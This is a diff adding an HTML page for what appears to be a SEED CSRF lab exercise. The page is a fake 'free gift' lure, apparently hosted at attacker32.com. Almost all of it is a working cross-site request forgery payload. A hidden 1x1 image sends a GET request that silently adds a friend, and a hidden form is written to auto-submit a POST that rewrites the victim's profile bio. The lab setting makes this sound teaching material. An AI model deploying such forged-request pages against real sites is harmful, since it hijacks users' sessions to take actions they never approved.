@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>www.attacker32.com — Free Gift Offers!</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; background: #fff0f0; }
+        .container { max-width: 800px; margin: auto; background: white; padding: 30px; border-radius: 8px; border: 2px solid #e74c3c; }
+        h1 { color: #c0392b; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>Congratulations! You've Won a Free Gift!</h1>
+    <p>Loading your free gift claim code...</p>
+
+    <!-- Task 2: CSRF GET payload (adds Samy ID 59 as Alice's friend invisibly) -->
+    <img src="http://www.seed-server.com/index.php?action=addfriend&friend=59" width="1" height="1" alt="" style="display:none;">
+
+    <!-- Task 3: CSRF POST payload (hidden form auto-submitted via JavaScript) -->
+    <form id="csrf-post-form" action="http://www.seed-server.com/index.php" method="POST">
+        <input type="hidden" name="action" value="update_profile">
+        <input type="hidden" name="bio" value="Hacked by CSRF attack from www.attacker32.com!">
+    </form>
+
+    <script>
+        // Uncomment to test automatic POST submission:
+        // document.getElementById('csrf-post-form').submit();
+    </script>
+</div>
+</body>
+</html>
